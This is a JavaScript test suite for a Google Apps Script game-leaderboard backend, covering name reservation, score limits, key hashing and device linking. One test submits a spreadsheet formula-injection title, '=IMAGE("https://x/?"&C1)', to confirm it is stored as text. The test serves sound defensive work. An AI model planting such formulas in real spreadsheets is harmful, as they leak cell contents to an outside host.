// Testes do scripts/ranking_apps_script.gs fora do Google: `node scripts/ranking_apps_script.test.js`.
// Roda o .gs num contexto com uma planilha em memória e os serviços do Apps Script simulados.
'use strict';
const fs = require('fs');
const vm = require('vm');
const crypto = require('crypto');
const assert = require('assert');
const realNow = Date.now;

function newContext() {
  const sheets = {};
  const reads = { n: 0 };
  const props = {};
  const cache = {};
  const clock = { offset: 0 };
  const now = () => realNow() + clock.offset;
  // Como o Google Planilhas: sem o formato de texto ('@'), "007" vira 7, "true" vira booleano e "=..." vira
  // fórmula; o apóstrofo no começo força texto (e some na leitura).
  const sheet = (name) => {
    const rows = [];
    let text = false;
    const cell = (v) => {
      if (typeof v !== 'string') return v;
      if (v.startsWith("'")) return v.slice(1);
      if (v.startsWith('=')) return '#FÓRMULA';
      if (text) return v;
      if (/^[+-]?\d+(\.\d+)?$/.test(v)) return Number(v);
      if (v.toLowerCase() === 'true') return true;
      return v;
    };
    return {
      name,
      rows,
      getLastRow: () => rows.length,
      appendRow: (row) => rows.push(row.map(cell)),
      deleteRow: (n) => rows.splice(n - 1, 1),
      // Como no Google: uma aba vazia devolve uma linha com uma célula vazia.
      getDataRange: () => ({ getValues: () => { reads.n++; return rows.length ? rows.map((r) => r.slice()) : [['']]; } }),
      getRange: (row, col, numRows, numCols) => ({
        setNumberFormat: (format) => { if (format === '@') text = true; },
        setValues: (values) => {
          for (let i = 0; i < numRows; i++) {
            for (let j = 0; j < numCols; j++) rows[row - 1 + i][col - 1 + j] = cell(values[i][j]);
          }
        },
      }),
    };
  };
  const book = {
    getId: () => 'planilha',
    getSheetByName: (name) => sheets[name] || null,
    insertSheet: (name) => (sheets[name] = sheet(name)),
  };
  const context = {
    sheets,
    reads,
    console,
    SpreadsheetApp: { create: () => book, openById: () => book },
    PropertiesService: {
      getScriptProperties: () => ({ getProperty: (k) => props[k] || null, setProperty: (k, v) => (props[k] = v) }),
    },
    LockService: { getScriptLock: () => ({ waitLock: () => {}, releaseLock: () => {} }) },
    // Como o do Google: cada valor vence depois de [ttl] segundos (no relógio falso, que [advance] adianta).
    CacheService: {
      getScriptCache: () => ({
        get: (k) => (k in cache && cache[k].until > now() ? cache[k].value : null),
        put: (k, v, ttl) => (cache[k] = { value: String(v), until: now() + (ttl || 600) * 1000 }),
        remove: (k) => delete cache[k],
      }),
    },
    ContentService: {
      MimeType: { JSON: 'json' },
      createTextOutput: (text) => ({ text, setMimeType() { return this; } }),
    },
    Utilities: {
      DigestAlgorithm: { SHA_256: 'sha256' },
      getUuid: () => crypto.randomUUID(),
      computeDigest: (_alg, value) => Array.from(crypto.createHash('sha256').update(value).digest()).map((b) => (b > 127 ? b - 256 : b)),
    },
  };
  vm.createContext(context);
  context.__now = now;
  vm.runInContext('Date.now = function () { return __now(); };', context);
  vm.runInContext(fs.readFileSync(__dirname + '/ranking_apps_script.gs', 'utf8'), context);
  context.advance = (ms) => { clock.offset += ms; };
  context.call = (body) => JSON.parse(context.doPost({ postData: { contents: JSON.stringify(body) } }).text);
  return context;
}

// Chaves do tamanho das do app (UUID): o script recusa chaves curtas.
const K = (letter) => letter.repeat(36);

const play = (key, extra) => Object.assign({
  acao: 'enviar', chave: key, mapa: 'm1', titulo: 'Música', artista: 'Banda', dificuldade: 'HARD',
  pontos: 100, precisao: 0.9, combo: 50, perfeitos: 40, semErrar: 30000, notas: 85,
}, extra);

// O placar vem inteiro (todas as dificuldades e números): o celular ordena e filtra na hora.
const boardOf = (c, key, map) => c.call({ acao: 'placar', chave: key, mapa: map || 'm1' }).linhas;
// O app novo pede as três tabelas de uma vez e troca entre elas na tela.
const allBoardOf = (c, key, map) => c.call({ acao: 'placar', chave: key, mapa: map || 'm1', tabelas: true }).linhas;

const tests = {
  reservaENomeEmUso() {
    const c = newContext();
    assert.deepStrictEqual(c.call({ acao: 'reservar', nome: 'Rodrigo', chave: K('A') }), { ok: true, nome: 'Rodrigo' });
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'rodrigo', chave: K('B') }).motivo, 'nome_em_uso');
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'ab', chave: K('B') }).motivo, 'nome_invalido');
    assert.strictEqual(c.call({ acao: 'reservar', nome: ' Ana ', chave: K('B') }).nome, 'Ana');
  },
  twoRegistrationsOfTheSameNameOnlyOneWins() {
    const c = newContext();
    const first = c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    const second = c.call({ acao: 'reservar', nome: 'ANA', chave: K('B') });
    assert.strictEqual([first.ok, second.ok].filter(Boolean).length, 1);
  },
  renomearLiberaOAntigoEMantemPontuacoes() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Rodrigo', chave: K('A') });
    c.call(play(K('A')));
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Digo', chave: K('A') }).ok, true);
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Rodrigo', chave: K('B') }).ok, true);
    assert.deepStrictEqual(boardOf(c, K('B')).map((l) => [l.nome, l.pontos]), [['Digo', 100]]);
  },
  aWrongKeyCannotRenameOrSubmit() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Rodrigo', chave: K('A') });
    assert.strictEqual(c.call(play(K('X'))).motivo, 'sem_nome');
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Rodrigo', chave: K('X') }).motivo, 'nome_em_uso');
  },
  guardaOMelhorDeCadaNumero() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Rodrigo', chave: K('A') });
    c.call(play(K('A'), { pontos: 100, combo: 50 }));
    const second = c.call(play(K('A'), { pontos: 90, combo: 70 }));
    assert.deepStrictEqual([second.posicao, second.total], [1, 1]);
    const line = boardOf(c, K('A'))[0];
    assert.deepStrictEqual([line.pontos, line.combo, line.notas], [100, 70, 85]);
  },
  placarTrazTodosComVoceMarcado() {
    const c = newContext();
    [['Ana', K('A'), 300], ['Bruno', K('B'), 200]].forEach(([n, k, p]) => {
      c.call({ acao: 'reservar', nome: n, chave: k });
      c.call(play(k, { pontos: p }));
    });
    c.call(play(K('A'), { dificuldade: 'EXPERT', pontos: 999 }));
    const lines = boardOf(c, K('B'));
    assert.deepStrictEqual(lines.map((l) => [l.nome, l.dificuldade, l.voce]).sort(),
      [['Ana', 'EXPERT', false], ['Ana', 'HARD', false], ['Bruno', 'HARD', true]]);
  },
  semErrarAntigoVemVazio() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    c.call(play(K('A'), { semErrar: null, notas: null }));
    const line = boardOf(c, K('A'))[0];
    assert.deepStrictEqual([line.semErrar, line.notas], [null, null]);
  },
  musicasComJogadoresESuaPosicao() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    c.call({ acao: 'reservar', nome: 'Bruno', chave: K('B') });
    c.call(play(K('A'), { pontos: 300 }));
    c.call(play(K('B'), { pontos: 200 }));
    c.call(play(K('B'), { mapa: 'm2', titulo: 'Outra', dificuldade: 'EASY' }));
    const songs = c.call({ acao: 'musicas', chave: K('B'), busca: '' }).musicas;
    const m1 = songs.find((s) => s.mapa === 'm1');
    assert.deepStrictEqual([m1.titulo, m1.jogadores, m1.suaPosicao], ['Música', 2, 2]);
    assert.strictEqual(c.call({ acao: 'musicas', chave: K('B'), busca: 'outr' }).musicas.length, 1);
  },
  semNadaAindaTudoVazio() {
    const c = newContext();
    assert.deepStrictEqual(c.call({ acao: 'musicas', chave: K('A'), busca: '' }).musicas, []);
    assert.deepStrictEqual(boardOf(c, K('A')), []);
  },
  nomesQueAPlanilhaConverteContinuamUnicos() {
    const c = newContext();
    assert.strictEqual(c.call({ acao: 'reservar', nome: '007', chave: K('A') }).ok, true);
    assert.strictEqual(c.call({ acao: 'reservar', nome: '007', chave: K('B') }).motivo, 'nome_em_uso');
    c.call({ acao: 'reservar', nome: 'true', chave: K('C') });
    c.call(play(K('A')));
    c.call(play(K('C')));
    assert.deepStrictEqual(boardOf(c, K('A')).map((l) => l.nome).sort(), ['007', 'true']);
  },
  tituloComIgualNaoViraFormula() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    c.call(play(K('A'), { titulo: '=IMAGE("https://x/?"&C1)', artista: '+44' }));
    const song = c.call({ acao: 'musicas', chave: K('A'), busca: '' }).musicas[0];
    assert.deepStrictEqual([song.titulo, song.artista], ['=IMAGE("https://x/?"&C1)', '+44']);
  },
  limitePorHora() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    for (let i = 0; i < 60; i++) assert.strictEqual(c.call(play(K('A'))).ok, true);
    assert.strictEqual(c.call(play(K('A'))).motivo, 'limite');
  },
  chaveGuardadaSoComoHash() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: 'segredo-123-segredo-123' });
    assert.ok(!JSON.stringify(c.sheets).includes('segredo-123-segredo-123'));
  },
  chaveCurtaOuVaziaERecusada() {
    const c = newContext();
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Ana', chave: '' }).motivo, 'pedido');
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Ana', chave: 'curta' }).motivo, 'pedido');
    assert.strictEqual(c.call(play('')).motivo, 'pedido');
    // Ler o ranking continua aberto (o celular sem nome ainda não tem chave).
    assert.strictEqual(c.call({ acao: 'musicas', chave: '', busca: '' }).ok, true);
  },
  reservasLimitadasPorCelular() {
    const c = newContext();
    for (let i = 0; i < 5; i++) assert.strictEqual(c.call({ acao: 'reservar', nome: 'Nome' + i, chave: K('A') }).ok, true);
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Nome9', chave: K('A') }).motivo, 'limite');
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Outro', chave: K('B') }).ok, true);
  },
  reservasLimitadasNoTotal() {
    const c = newContext();
    for (let i = 0; i < 100; i++) {
      assert.strictEqual(c.call({ acao: 'reservar', nome: 'Jogador' + i, chave: String(i).padStart(36, 'x') }).ok, true);
    }
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Mais um', chave: K('Z') }).motivo, 'limite');
  },
  variosEnviosNumPedido() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    const envios = [];
    for (let i = 0; i < 50; i++) envios.push(play(K('A'), { mapa: 'm' + i, acao: undefined, chave: undefined }));
    const answer = c.call({ acao: 'enviarVarios', chave: K('A'), envios });
    assert.strictEqual(answer.ok, true);
    assert.strictEqual(answer.resultados.length, 50);
    assert.deepStrictEqual([answer.resultados[0].ok, answer.resultados[0].posicao], [true, 1]);
    assert.strictEqual(c.call({ acao: 'musicas', chave: K('A'), busca: '' }).musicas.length, 50);
    // Um pedido conta uma vez no limite por hora.
    for (let i = 0; i < 59; i++) c.call(play(K('A')));
    assert.strictEqual(c.call(play(K('A'))).motivo, 'limite');
  },
  variosEnviosRecusaOQueNaoServeSemPerderOResto() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    const answer = c.call({ acao: 'enviarVarios', chave: K('A'), envios: [play(K('A')), play(K('A'), { mapa: '' })] });
    assert.deepStrictEqual(answer.resultados.map((r) => r.ok ? 'ok' : r.motivo), ['ok', 'pedido']);
  },
  variosEnviosSemNomeOuDemaisERecusado() {
    const c = newContext();
    assert.strictEqual(c.call({ acao: 'enviarVarios', chave: K('A'), envios: [play(K('A'))] }).motivo, 'sem_nome');
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    const many = [];
    for (let i = 0; i < 51; i++) many.push(play(K('A')));
    assert.strictEqual(c.call({ acao: 'enviarVarios', chave: K('A'), envios: many }).motivo, 'lote_invalido');
  },
  removerJogadorTiraTudoENaoVoltaSozinho() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    c.call(play(K('A')));
    c.call({ acao: 'reservar', nome: 'Bruno', chave: K('B') });
    c.call(play(K('B')));
    c.removerJogador('ana');
    assert.deepStrictEqual(boardOf(c, K('B')).map((l) => l.nome), ['Bruno']);
    assert.strictEqual(c.call(play(K('A'))).motivo, 'removido');
    assert.strictEqual(c.call({ acao: 'enviarVarios', chave: K('A'), envios: [play(K('A'))] }).motivo, 'removido');
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') }).motivo, 'removido');
    // O nome fica livre para outra pessoa.
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Ana', chave: K('C') }).ok, true);
  },
  loteRecusadoPeloScriptNovoNaoParecePedidoDoAntigo() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    assert.strictEqual(c.call({ acao: 'enviarVarios', chave: 'curta', envios: [play('curta')] }).motivo, 'lote_invalido');
    assert.strictEqual(c.call({ acao: 'enviarVarios', chave: K('A'), envios: [] }).motivo, 'lote_invalido');
  },
  nomesEmUsoNaoGastamOLimiteDeTodos() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    for (let i = 0; i < 150; i++) c.call({ acao: 'reservar', nome: 'Ana', chave: String(i).padStart(36, 'x') });
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Bruno', chave: K('B') }).ok, true);
  },
  salvarOMesmoNomeDeNovoNaoGastaOLimiteDoCelular() {
    const c = newContext();
    for (let i = 0; i < 10; i++) assert.strictEqual(c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') }).ok, true);
  },
  loteLeAPlanilhaPoucasVezes() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    const envios = [];
    for (let i = 0; i < 50; i++) envios.push(play(K('A'), { mapa: 'm' + i }));
    c.reads.n = 0;
    assert.strictEqual(c.call({ acao: 'enviarVarios', chave: K('A'), envios }).ok, true);
    assert.ok(c.reads.n <= 4, 'leituras: ' + c.reads.n);
  },
  pontuacoesPorHoraTemTeto() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    const lote = (n) => Array.from({ length: 50 }, (_, i) => play(K('A'), { mapa: n + '-' + i }));
    for (let i = 0; i < 6; i++) assert.strictEqual(c.call({ acao: 'enviarVarios', chave: K('A'), envios: lote(i) }).ok, true);
    assert.strictEqual(c.call({ acao: 'enviarVarios', chave: K('A'), envios: lote(9) }).motivo, 'limite');
  },
  pedidoEstranhoNaoQuebra() {
    const c = newContext();
    assert.strictEqual(JSON.parse(c.doPost({ postData: { contents: 'não é json' } }).text).ok, false);
    assert.strictEqual(c.call({ acao: 'outra' }).ok, false);
  },

  // --- 4d: três tabelas ---
  envioSemTabelaVaiParaOCelular() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    c.call(play(K('A')));
    assert.deepStrictEqual(allBoardOf(c, K('A')).map((l) => l.tabela), ['celular']);
    assert.strictEqual(c.sheets['Pontuações'].rows[0][12], 'celular');
  },
  pcPalhetaSeparadoDoCelularNoMesmoMapa() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    c.call(play(K('A'), { pontos: 100 }));
    c.call(play(K('A'), { pontos: 50, tabela: 'pc_palheta' }));
    c.call(play(K('A'), { pontos: 70, tabela: 'pc_sem_palheta' }));
    assert.deepStrictEqual(allBoardOf(c, K('A')).map((l) => [l.tabela, l.pontos]).sort(),
      [['celular', 100], ['pc_palheta', 50], ['pc_sem_palheta', 70]]);
    // O app 0.5.0 (sem "tabelas") só vê o celular, sem o campo novo.
    const old = boardOf(c, K('A'));
    assert.deepStrictEqual(old.map((l) => l.pontos), [100]);
    assert.ok(!('tabela' in old[0]));
  },
  posicaoDentroDaTabela() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    c.call({ acao: 'reservar', nome: 'Bruno', chave: K('B') });
    c.call(play(K('A'), { pontos: 300 }));
    const answer = c.call(play(K('B'), { pontos: 200, tabela: 'pc_palheta' }));
    assert.deepStrictEqual([answer.posicao, answer.total], [1, 1]);
    const phone = c.call(play(K('B'), { pontos: 200 }));
    assert.deepStrictEqual([phone.posicao, phone.total], [2, 2]);
  },
  tabelaDesconhecidaERecusada() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    assert.strictEqual(c.call(play(K('A'), { tabela: 'xbox' })).motivo, 'pedido');
    const many = c.call({ acao: 'enviarVarios', chave: K('A'), envios: [play(K('A')), play(K('A'), { tabela: 'xbox' })] });
    assert.deepStrictEqual(many.resultados.map((r) => r.ok ? 'ok' : r.motivo), ['ok', 'pedido']);
    assert.strictEqual(c.call(play(K('A'), { tabela: '' })).ok, true); // vazio = celular
  },
  linhasAntigasContamComoCelularEJogadorIgualAoHash() {
    const c = newContext();
    const hashA = crypto.createHash('sha256').update(K('A')).digest('hex');
    const hashB = crypto.createHash('sha256').update(K('B')).digest('hex');
    // A planilha de hoje: Jogadores sem "jogador" e Pontuações sem "tabela".
    const players = c.SpreadsheetApp.openById().insertSheet('Jogadores');
    players.rows.push(['Ana', 'ana', hashA, 't', 't'], ['Bruno', 'bruno', hashB, 't', 't']);
    const scores = c.SpreadsheetApp.openById().insertSheet('Pontuações');
    scores.rows.push([hashA, 'm1', 'Música', 'Banda', 'HARD', 300, 0.9, 50, 40, 30000, 't', 85],
      [hashB, 'm1', 'Música', 'Banda', 'HARD', 200, 0.8, 40, 30, 20000, 't', 85]);
    assert.deepStrictEqual(boardOf(c, K('B')).map((l) => [l.nome, l.voce]).sort(), [['Ana', false], ['Bruno', true]]);
    assert.deepStrictEqual(allBoardOf(c, K('B')).map((l) => l.tabela), ['celular', 'celular']);
    const song = c.call({ acao: 'musicas', chave: K('B'), busca: '', tabelas: true }).musicas[0];
    assert.deepStrictEqual([song.jogadores, song.suaPosicao], [2, 2]);
    // O envio de agora cai na mesma linha (jogador = hash, tabela = celular).
    const answer = c.call(play(K('B'), { pontos: 400 }));
    assert.deepStrictEqual([answer.posicao, answer.total], [1, 2]);
    assert.strictEqual(scores.rows.length, 2);
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Bruno', chave: K('B') }).ok, true);
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Ana', chave: K('C') }).motivo, 'nome_em_uso');
  },
  musicasSemTabelasSoContaOCelular() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    c.call({ acao: 'reservar', nome: 'Bruno', chave: K('B') });
    c.call(play(K('A'), { pontos: 300, tabela: 'pc_palheta' }));
    c.call(play(K('B'), { pontos: 200 }));
    c.call(play(K('B'), { pontos: 100, tabela: 'pc_palheta' }));
    c.call(play(K('A'), { mapa: 'so-pc', tabela: 'pc_sem_palheta' }));
    const old = c.call({ acao: 'musicas', chave: K('B'), busca: '' }).musicas;
    assert.deepStrictEqual(old.map((s) => [s.mapa, s.jogadores, s.suaPosicao]), [['m1', 1, 1]]);
    assert.ok(!('tabelas' in old[0]));
    const all = c.call({ acao: 'musicas', chave: K('B'), busca: '', tabelas: true }).musicas;
    const m1 = all.find((s) => s.mapa === 'm1');
    assert.deepStrictEqual([m1.jogadores, m1.suaPosicao], [2, 1]);
    assert.deepStrictEqual(m1.tabelas, {
      celular: { jogadores: 1, suaPosicao: 1 },
      pc_palheta: { jogadores: 2, suaPosicao: 2 },
    });
    const pcOnly = all.find((s) => s.mapa === 'so-pc');
    assert.deepStrictEqual([pcOnly.jogadores, pcOnly.suaPosicao], [1, null]);
  },

  // --- 4d: o mesmo nome em vários aparelhos ---
  codigoEVincularJuntamDoisAparelhos() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    c.call(play(K('A'), { pontos: 100, combo: 50 }));
    const code = c.call({ acao: 'codigo', chave: K('A') });
    assert.strictEqual(code.ok, true);
    assert.match(code.codigo, /^[ABCDEFGHJKMNPQRSTUVWXYZ23456789]{6}$/);
    const until = Date.parse(code.validoAte);
    assert.ok(Math.abs(until - Date.now() - 600000) < 5000, code.validoAte);
    assert.strictEqual(code.validoPor, 600);
    // Minúsculas e espaços (o usuário digita) servem.
    const typed = ' ' + code.codigo.slice(0, 3).toLowerCase() + ' ' + code.codigo.slice(3) + ' ';
    assert.deepStrictEqual(c.call({ acao: 'vincular', chave: K('B'), codigo: typed }), { ok: true, nome: 'Ana' });
    const second = c.call(play(K('B'), { pontos: 90, combo: 70, tabela: 'pc_palheta' }));
    assert.deepStrictEqual([second.ok, second.posicao], [true, 1]);
    c.call(play(K('B'), { pontos: 90, combo: 70 }));
    const lines = allBoardOf(c, K('B'));
    assert.deepStrictEqual(lines.map((l) => [l.tabela, l.nome, l.voce, l.pontos, l.combo]).sort(),
      [['celular', 'Ana', true, 100, 70], ['pc_palheta', 'Ana', true, 90, 70]]);
    assert.deepStrictEqual(boardOf(c, K('A')).map((l) => l.voce), [true]);
    assert.strictEqual(c.call({ acao: 'musicas', chave: K('A'), busca: '' }).musicas[0].jogadores, 1);
  },
  codigoErradoVencidoOuUsadoERecusado() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    const first = c.call({ acao: 'codigo', chave: K('A') }).codigo;
    const code = c.call({ acao: 'codigo', chave: K('A') }).codigo; // pedir de novo troca o código
    assert.strictEqual(c.call({ acao: 'vincular', chave: K('B'), codigo: first }).motivo, 'codigo_invalido');
    const wrong = code === 'AAAAAA' ? 'BBBBBB' : 'AAAAAA';
    assert.strictEqual(c.call({ acao: 'vincular', chave: K('B'), codigo: wrong }).motivo, 'codigo_invalido');
    assert.strictEqual(c.call({ acao: 'vincular', chave: K('B'), codigo: code }).ok, true);
    assert.strictEqual(c.call({ acao: 'vincular', chave: K('C'), codigo: code }).motivo, 'codigo_invalido');
    const late = c.call({ acao: 'codigo', chave: K('A') }).codigo;
    c.advance(10 * 60000 + 1000);
    assert.strictEqual(c.call({ acao: 'vincular', chave: K('C'), codigo: late }).motivo, 'codigo_invalido');
    assert.strictEqual(c.call(play(K('C'))).motivo, 'sem_nome');
  },
  codigoPedeNomeEChave() {
    const c = newContext();
    assert.strictEqual(c.call({ acao: 'codigo', chave: K('A') }).motivo, 'sem_nome');
    assert.strictEqual(c.call({ acao: 'codigo', chave: 'curta' }).motivo, 'pedido');
    assert.strictEqual(c.call({ acao: 'vincular', chave: 'curta', codigo: 'ABCDEF' }).motivo, 'pedido');
    assert.strictEqual(c.call({ acao: 'vincular', chave: K('B') }).motivo, 'codigo_invalido');
  },
  limitesDoVinculoPorHora() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    let code;
    for (let i = 0; i < 5; i++) code = c.call({ acao: 'codigo', chave: K('A') }).codigo;
    assert.strictEqual(c.call({ acao: 'codigo', chave: K('A') }).motivo, 'limite');
    const wrong = code === 'AAAAAA' ? 'BBBBBB' : 'AAAAAA';
    for (let i = 0; i < 5; i++) assert.strictEqual(c.call({ acao: 'vincular', chave: K('B'), codigo: wrong }).motivo, 'codigo_invalido');
    // Errar conta: a sexta tentativa é recusada mesmo com o código certo.
    assert.strictEqual(c.call({ acao: 'vincular', chave: K('B'), codigo: code }).motivo, 'limite');
    assert.strictEqual(c.call({ acao: 'vincular', chave: K('C'), codigo: code }).ok, true);
  },
  vincularComNomeProprioLiberaONomeEApagaAsPontuacoes() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    c.call({ acao: 'reservar', nome: 'Bia', chave: K('B') });
    c.call(play(K('A'), { pontos: 100 }));
    c.call(play(K('B'), { pontos: 900 }));
    c.call(play(K('B'), { mapa: 'm2' }));
    const code = c.call({ acao: 'codigo', chave: K('A') }).codigo;
    assert.deepStrictEqual(c.call({ acao: 'vincular', chave: K('B'), codigo: code }), { ok: true, nome: 'Ana' });
    assert.deepStrictEqual(boardOf(c, K('B')).map((l) => [l.nome, l.pontos, l.voce]), [['Ana', 100, true]]);
    assert.deepStrictEqual(c.call({ acao: 'musicas', chave: K('B'), busca: '' }).musicas.map((s) => s.mapa), ['m1']);
    assert.strictEqual(c.sheets['Pontuações'].rows.length, 1);
    assert.strictEqual(c.sheets['Jogadores'].rows.length, 2);
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Bia', chave: K('C') }).ok, true);
  },
  vincularDeAparelhoQueDividiaOJogadorSoTiraEsteAparelho() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    c.call({ acao: 'reservar', nome: 'Bia', chave: K('B') });
    c.call({ acao: 'vincular', chave: K('C'), codigo: c.call({ acao: 'codigo', chave: K('B') }).codigo });
    c.call(play(K('B'), { pontos: 900 }));
    c.call({ acao: 'vincular', chave: K('B'), codigo: c.call({ acao: 'codigo', chave: K('A') }).codigo });
    // Bia continua no outro aparelho (C), com as pontuações; B agora é a Ana.
    assert.deepStrictEqual(boardOf(c, K('C')).map((l) => [l.nome, l.pontos, l.voce]), [['Bia', 900, true]]);
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Bia', chave: K('C') }).ok, true);
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Bia', chave: K('D') }).motivo, 'nome_em_uso');
    c.call(play(K('B'), { pontos: 100 }));
    assert.deepStrictEqual(boardOf(c, K('C')).map((l) => [l.nome, l.voce]).sort(), [['Ana', false], ['Bia', true]]);
  },
  vincularOProprioCodigoNaoQuebra() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    c.call(play(K('A')));
    const code = c.call({ acao: 'codigo', chave: K('A') }).codigo;
    assert.deepStrictEqual(c.call({ acao: 'vincular', chave: K('A'), codigo: code }), { ok: true, nome: 'Ana' });
    assert.strictEqual(c.sheets['Jogadores'].rows.length, 1);
    assert.deepStrictEqual(boardOf(c, K('A')).map((l) => [l.nome, l.voce]), [['Ana', true]]);
    assert.strictEqual(c.call(play(K('A'))).ok, true);
  },
  oCodigoNaoFicaNaPlanilha() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    const code = c.call({ acao: 'codigo', chave: K('A') }).codigo;
    assert.strictEqual(c.call({ acao: 'vincular', chave: K('B'), codigo: code }).ok, true);
    assert.ok(!JSON.stringify(c.sheets).includes(code));
    assert.ok(!JSON.stringify(c.sheets).includes(K('B')));
  },
  trocarONomeTrocaNosDoisAparelhos() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    c.call({ acao: 'vincular', chave: K('B'), codigo: c.call({ acao: 'codigo', chave: K('A') }).codigo });
    c.call(play(K('A')));
    assert.deepStrictEqual(c.call({ acao: 'reservar', nome: 'Aninha', chave: K('B') }), { ok: true, nome: 'Aninha' });
    assert.deepStrictEqual(boardOf(c, K('A')).map((l) => l.nome), ['Aninha']);
    assert.ok(c.sheets['Jogadores'].rows.every((r) => r[0] === 'Aninha'));
    // O nome é do próprio jogador: salvar de novo no outro aparelho não é "em uso".
    assert.deepStrictEqual(c.call({ acao: 'reservar', nome: 'aninha', chave: K('A') }), { ok: true, nome: 'aninha' });
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Aninha', chave: K('C') }).motivo, 'nome_em_uso');
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Ana', chave: K('C') }).ok, true);
  },
  removerJogadorApagaTodosOsAparelhos() {
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    c.call({ acao: 'vincular', chave: K('B'), codigo: c.call({ acao: 'codigo', chave: K('A') }).codigo });
    c.call(play(K('A')));
    c.call(play(K('B'), { tabela: 'pc_palheta' }));
    const pending = c.call({ acao: 'codigo', chave: K('A') }).codigo;
    c.removerJogador('Ana');
    assert.deepStrictEqual(allBoardOf(c, K('C')), []);
    assert.strictEqual(c.sheets['Jogadores'].rows.length, 0);
    assert.strictEqual(c.sheets['Removidos'].rows.length, 2);
    assert.strictEqual(c.call(play(K('A'))).motivo, 'removido');
    assert.strictEqual(c.call(play(K('B'))).motivo, 'removido');
    assert.strictEqual(c.call({ acao: 'codigo', chave: K('B') }).motivo, 'removido');
    assert.strictEqual(c.call({ acao: 'vincular', chave: K('C'), codigo: pending }).motivo, 'codigo_invalido');
    c.call({ acao: 'reservar', nome: 'Caio', chave: K('C') });
    const other = c.call({ acao: 'codigo', chave: K('C') }).codigo;
    assert.strictEqual(c.call({ acao: 'vincular', chave: K('A'), codigo: other }).motivo, 'removido');
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Ana', chave: K('D') }).ok, true);
  },
  jogadorApagadoAMaoNaoJuntaComOutro() {
    // B entra na Ana; a linha de B some à mão; B reserva de novo: vira um jogador novo, sem pegar o de C.
    const c = newContext();
    c.call({ acao: 'reservar', nome: 'Bia', chave: K('B') });
    c.call({ acao: 'vincular', chave: K('C'), codigo: c.call({ acao: 'codigo', chave: K('B') }).codigo });
    c.call({ acao: 'reservar', nome: 'Ana', chave: K('A') });
    assert.strictEqual(c.call({ acao: 'vincular', chave: K('B'), codigo: c.call({ acao: 'codigo', chave: K('A') }).codigo }).ok, true);
    const players = c.sheets['Jogadores'];
    const hashB = crypto.createHash('sha256').update(K('B')).digest('hex');
    players.rows.splice(players.rows.findIndex((r) => r[2] === hashB), 1);
    assert.strictEqual(c.call({ acao: 'reservar', nome: 'Beto', chave: K('B') }).ok, true);
    c.call(play(K('B')));
    assert.deepStrictEqual(boardOf(c, K('C')).map((l) => [l.nome, l.voce]), [['Beto', false]]);
  },
};

let failed = 0;
for (const [name, test] of Object.entries(tests)) {
  try {
    test();
    console.log('ok   ' + name);
  } catch (e) {
    failed++;
    console.log('FAIL ' + name + ': ' + e.message);
  }
}
if (failed) process.exit(1);
